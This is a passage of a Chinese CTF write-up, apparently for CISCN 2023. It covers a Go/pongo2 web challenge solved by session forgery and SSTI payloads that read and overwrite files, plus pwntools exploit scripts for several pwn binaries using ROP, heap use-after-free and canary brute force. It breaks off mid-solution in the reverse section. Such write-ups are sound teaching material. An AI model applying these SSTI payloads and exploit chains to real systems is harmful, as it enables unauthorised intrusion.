class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> route<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/flosch/pongo2/v6&quot;</span><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;github.com/gorilla/sessions&quot;</span><br><span class="hljs-string">&quot;html&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> store = sessions.NewCookieStore([]<span class="hljs-type">byte</span>(os.Getenv(<span class="hljs-string">&quot;SESSION_KEY&quot;</span>)))<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Index</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-literal">nil</span> &#123;<br>session.Values[<span class="hljs-string">&quot;name&quot;</span>] = <span class="hljs-string">&quot;guest&quot;</span><br>err = session.Save(c.Request, c.Writer)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><br>c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;Hello, guest&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Admin</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] != <span class="hljs-string">&quot;admin&quot;</span> &#123;<br>http.Error(c.Writer, <span class="hljs-string">&quot;N0&quot;</span>, http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>name := c.DefaultQuery(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;ssti&quot;</span>)<br>xssWaf := html.EscapeString(name)<br>tpl, err := pongo2.FromString(<span class="hljs-string">&quot;Hello &quot;</span> + xssWaf + <span class="hljs-string">&quot;!&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>out, err := tpl.Execute(pongo2.Context&#123;<span class="hljs-string">&quot;c&quot;</span>: c&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>c.String(<span class="hljs-number">200</span>, out)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Flask</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, <span class="hljs-string">&quot;N0&quot;</span>, http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>resp, err := http.Get(<span class="hljs-string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;guest&quot;</span>))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br>body, _ := io.ReadAll(resp.Body)<br><br>c.String(<span class="hljs-number">200</span>, <span class="hljs-type">string</span>(body))<br>&#125;<br></code></pre></td></tr></table></figure><p>有三个路由</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">r.GET(<span class="hljs-string">&quot;/&quot;</span>, route.Index)<br>r.GET(<span class="hljs-string">&quot;/admin&quot;</span>, route.Admin)<br>r.GET(<span class="hljs-string">&quot;/flask&quot;</span>, route.Flask)<br></code></pre></td></tr></table></figure><p><code>Index</code>路由提供了一个默认的session，name赋值为guest<br><code>Admin</code>路由判断session，需要name值为admin，并使用EscapeString转义name，而且还使用了pongo2渲染，存在ssti漏洞<br><code>Flask</code>路由访问内部5000端口的flask服务并回显页面</p><p>因为<code>SESSION_KEY</code>是从环境变量获取的，猜测为空，进行<code>session</code>伪造<br>本地修改<code>session.Values[&quot;name&quot;] = &quot;admin&quot;</code>，运行拿到伪造的<code>session</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-1.png"></p><p>访问<code>/flask?name=/</code>通过报错拿到<code>flask</code>源码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-3.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args[<span class="hljs-string">&#x27;name&#x27;</span>]<br>    <span class="hljs-keyword">return</span> name + <span class="hljs-string">&#x27;no ssti&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__== <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;127.0.0.1&quot;</span>,port=<span class="hljs-number">5000</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>可以看到<code>flask</code>开启了<code>debug</code>模式，<code>debug</code>攻击点一般在<code>算pin</code>或<code>debug热加载</code><br>但是访问<code>/console</code>实现rce需要携带cookie验证，因为我们无法传递cookie，所以利用ssti读文件算pin后rce这条路走不通</p><p>如图，当flask文件的内容被更改后，flask会自动更新，也就是热加载</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-2.png"></p><p>所以我们可以利用ssti实现任意文件读写，然后覆盖server.py，实现自己的恶意内容</p><p>查阅<a href="https://pkg.go.dev/github.com/flosch/pongo2#section-readme">官方手册</a>可知pongo2与Django 1.7有兼容的语法和功能集</p><p>Django中的include语法在pongo2中也能使用，所以可以用include实现任意文件读取<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-6.png"></p><p>写文件可以⽤Gin Context里的FormFile来读取表单⽂件，用SaveUploadFile上传，注意需要用GET传参</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-8.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-7.png"></p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-comment">//读文件</span><br>&#123;%include c.Request.Referer()%&#125;<br>&#123;%include c.Request.Host()%&#125;<br><br><span class="hljs-comment">//写文件</span><br><span class="hljs-comment">//这三个payload其实大同小异，只是后两个使用了过滤器（c.HandlerName的值为 main/route.Admin ）</span><br>&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.Host),c.Request.Referer())&#125;&#125;<br>&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;&#123;c.SaveUploadedFile(c.FormFile(form),c.Request.Referer())&#125;&#125;&amp;m=file<br>&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;%set path=c.Query(c.HandlerName|last)%&#125;&#123;%set file=c.FormFile(form)%&#125;&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;&amp;m=file&amp;n=/app/server.py<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-4.png"></p><p>覆盖后就可以执行我们自定义的内容了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-5.png"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="烧烤摊儿"><a href="#烧烤摊儿" class="headerlink" title="烧烤摊儿"></a>烧烤摊儿</h2><p>修改名称存在栈溢出，程序不存在<code>system</code>函数，使用<code>orw</code>获取<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./shaokao&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;123.56.251.120&quot;</span>,<span class="hljs-string">&quot;12585&quot;</span>)<br>e=ELF(<span class="hljs-string">&quot;./shaokao&quot;</span>)<br><br>fopen=e.sym[<span class="hljs-string">&#x27;open64&#x27;</span>]<br>read=e.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write=e.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401fae&#x27;)</span><br>rdi=<span class="hljs-number">0x000000000040264f</span> <span class="hljs-comment">#rdi</span><br>rsi=<span class="hljs-number">0x000000000040a67e</span> <span class="hljs-comment">#rsi</span><br>rdx=<span class="hljs-number">0x00000000004a404b</span> <span class="hljs-comment">#rdx rbx</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;-100000&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(rdi)+p64(<span class="hljs-number">0x4e60f0</span>)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(fopen)<br>payload+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(<span class="hljs-number">0x4e60f0</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(read)<br>payload+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(write)<br>p.sendline(payload)<br></code></pre></td></tr></table></figure><h2 id="StrangeTalkBot"><a href="#StrangeTalkBot" class="headerlink" title="StrangeTalkBot"></a>StrangeTalkBot</h2><p>程序使用了<code>protobuf</code>协议解析输入数据，构造<code>protobuf</code>数据，传入即可<br>程序中存在<code>uaf</code>漏洞与数组越界漏洞，利用<code>gadget</code>构造栈迁移，实现<code>orw</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> varint<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Mode</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x08&#x27;</span>+varint.encode(m&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Ind</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x10&#x27;</span>+varint.encode(i&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Size</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x18&#x27;</span>+varint.encode(s&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Data</span>(<span class="hljs-params">d</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x22&#x27;</span>+varint.encode(<span class="hljs-built_in">len</span>(d))+d<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">b&#x27; &#x27;</span></span>):<br>    payload=Mode(<span class="hljs-number">1</span>)+Ind(ind)+Size(size)+Data(data)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    payload=Mode(<span class="hljs-number">2</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(data)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    payload=Mode(<span class="hljs-number">3</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(<span class="hljs-string">b&#x27;&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    payload=Mode(<span class="hljs-number">4</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(<span class="hljs-string">b&#x27;&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)==<span class="hljs-number">1</span>:<br>    p=process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>    gdb.attach(p)<br><span class="hljs-keyword">else</span>:<br>    p=remote(<span class="hljs-string">&quot;123.56.244.196&quot;</span>,<span class="hljs-string">&quot;35492&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(i,<span class="hljs-number">0xe8</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(i)<br><br>show(<span class="hljs-number">1</span>)<br>heap=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br><br>show(<span class="hljs-number">2</span>)<br>heap1=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap1))<br><br>free(<span class="hljs-number">7</span>)<br>free(<span class="hljs-number">8</span>)<br><br>show(<span class="hljs-number">8</span>)<br>d=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>libc.address=d-<span class="hljs-number">0x1eccc0</span><br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>gadget=libc.address+<span class="hljs-number">0x154dea</span><br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>rdi=<span class="hljs-number">0x0000000000023b6a</span>+libc.address<br>rsi=<span class="hljs-number">0x000000000002601f</span>+libc.address<br>rdx=<span class="hljs-number">0x0000000000142c92</span>+libc.address<br>leave=libc.address+<span class="hljs-number">0x00000000000578c8</span><br>edit(<span class="hljs-number">6</span>,p64(free_hook))<br><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-number">0xe8</span>)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span><br><br>edit(<span class="hljs-number">0</span>,flat([heap+<span class="hljs-number">0x48</span>,leave,<br>    heap1&amp;<span class="hljs-number">0xfffffffffffff000</span>,<br>    heap,<span class="hljs-number">0</span>,<br>    leave,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>    heap,<br>    rdi,heap1&amp;<span class="hljs-number">0xfffffffffffff000</span>,<br>    rsi,<span class="hljs-number">0x1000</span>,<br>    rdx,<span class="hljs-number">7</span>,<br>    mprotect,<br>    heap1]))<br><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)+shellcraft.read(<span class="hljs-number">3</span>,heap-<span class="hljs-number">0x50</span>,<span class="hljs-number">0x50</span>)+shellcraft.write(<span class="hljs-number">1</span>,heap-<span class="hljs-number">0x50</span>,<span class="hljs-number">0x50</span>)<br>edit(<span class="hljs-number">1</span>,asm(shellcode))<br><br>add(<span class="hljs-number">0x11</span>,<span class="hljs-number">0xe8</span>)<br>add(<span class="hljs-number">0x12</span>,<span class="hljs-number">0xe8</span>,p64(gadget))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_hook))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(gadget))<br><br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h2><p>程序使用了<code>fork</code>，所以在子进程中报错，不会使程序中断，所以爆破<code>canary</code>，然后跳转到后门位置就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>backdoor=<span class="hljs-number">0x1229</span><br><br><span class="hljs-comment">#p=process(&quot;./funcanary&quot;)</span><br>p=remote(<span class="hljs-string">&quot;123.56.135.185&quot;</span>,<span class="hljs-string">&quot;32640&quot;</span>)<br><br>canary=<span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>        p.sendafter(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+canary+p8(j))<br>        data=p.readline()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;stack&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-built_in">print</span>(j)<br>            canary+=p8(j)<br>            <span class="hljs-keyword">break</span><br>i=<span class="hljs-number">0</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-number">0x10</span>:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>):<br>        data=p.readuntil(<span class="hljs-string">&#x27;welcome\n&#x27;</span>)<br>        f.write(data)<br>        p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p16(<span class="hljs-number">0xffff</span>&amp;(<span class="hljs-number">0x1200</span>+j+i*<span class="hljs-number">0x1000</span>)))<br>        pause()<br>    i+=<span class="hljs-number">1</span><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Shell-We-Go"><a href="#Shell-We-Go" class="headerlink" title="Shell We Go"></a>Shell We Go</h2><p>当认证结束之后，执行<code>echo</code>指令，存在栈溢出，使用<code>+</code>可以跳过栈空间，直接覆盖返回值<br>构造<code>rop</code>，执行<code>orw</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;47.93.187.243&quot;</span>,<span class="hljs-string">&quot;38686&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;cert nAcDsMicN  S33UAga1n@#!&quot;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>cmd=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">bp 0x4c181a</span><br><span class="hljs-string">bp 0x4c18a0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">makepayload</span>(<span class="hljs-params">data</span>):<br>    e=<span class="hljs-string">b&#x27;&#x27;</span><br>    i=<span class="hljs-number">0</span><br>    step=<span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(data):<br>        e+=data[i:i+step]+<span class="hljs-string">b&#x27; &#x27;</span><br>        i+=step<br>    <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;echo &#x27;</span>+e<br><br>rdi=<span class="hljs-number">0x0000000000444fec</span><br>system=<span class="hljs-number">0x43e7e6</span><br>rsi=<span class="hljs-number">0x000000000041e818</span><br>rdx=<span class="hljs-number">0x000000000049e11d</span><br>sh=<span class="hljs-number">0x4c38e7</span><br>rax=<span class="hljs-number">0x000000000040d9e6</span><br>flag=<span class="hljs-number">0x4c34c8</span><br>syscall=<span class="hljs-number">0x000000000040328c</span><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>bss=e.bss()<br><br>payload=<span class="hljs-string">b&#x27;+&#x27;</span>*(<span class="hljs-number">0x298</span>-<span class="hljs-number">0x78</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">3</span>+p64(rdi)+p64(flag)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(rdx)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">2</span>)+p64(syscall)<br>payload+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(bss+<span class="hljs-number">0x200</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+p64(rax)+p64(<span class="hljs-number">0</span>)+p64(syscall)<br>payload+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rsi)+p64(bss+<span class="hljs-number">0x200</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+p64(rax)+p64(<span class="hljs-number">1</span>)+p64(syscall)<br><br>p.sendline(makepayload(payload))<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h2><p><a href="https://snap.berkeley.edu/">https://snap.berkeley.edu/</a> 导入xml</p><p>导出密文后异或得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-reverse-babyre.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">102</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">28</span>,<span class="hljs-number">74</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">85</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">75</span>,<span 